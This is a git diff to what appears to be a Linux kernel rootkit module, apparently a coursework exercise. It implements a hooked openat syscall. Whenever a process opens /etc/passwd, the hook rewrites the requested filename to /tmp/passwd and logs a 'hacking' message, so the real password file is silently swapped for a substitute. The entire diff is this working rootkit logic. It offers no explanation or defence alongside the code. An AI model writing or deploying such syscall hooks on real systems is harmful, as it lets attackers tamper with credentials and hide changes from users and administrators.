@@ -44,8 +44,12 @@ static int disable_page_rw(void *ptr){
 // Define your new sneaky version of the 'openat' syscall
 static asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
 {
-  // Implement the sneaky part here
-  return (*original_openat)(regs);
+  const char * filename = (char *)regs->si;
+  if (strcmp(filename, "/etc/passwd") == 0) {
+    copy_to_user((void *)filename, "/tmp/passwd", strlen("/tmp/passwd"));
+    printk(KERN_INFO "***hacking openat - filename: %s***\n", filename);
+  }    
+  return original_openat(regs);
 }
 
 // The code that gets executed when the module is loaded
